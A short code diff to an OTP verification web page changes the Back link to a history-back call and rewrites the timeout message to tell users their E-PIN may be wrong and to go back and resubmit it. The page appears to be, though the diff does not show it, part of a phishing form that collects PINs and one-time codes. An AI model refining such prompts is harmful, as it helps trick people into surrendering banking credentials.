@@ -387,7 +387,7 @@
             <button class="verify-button" name="again" id="verifyBtn">Verify</button>
 
             <div class="back-button">
-                <a href="/k.html">← Back</a>
+                <a href="javascript:window.history.back();">← Back</a>
             </div>
         </form>
     </div>
@@ -522,7 +522,8 @@
                     resendTimer = 60;
                     
                     // Update the message when timer expires
-                    otpMessage.textContent = "If you have not received OTP yet, you might have entered incorrect details. Go back and correct them.";
+                    otpMessage.textContent = `Didn’t receive the OTP? Your E-PIN may be incorrect.
+Click Back to submit the correct PIN`;
                     // timeoutMessage.classList.add('show');
                 }
             }, 1000);
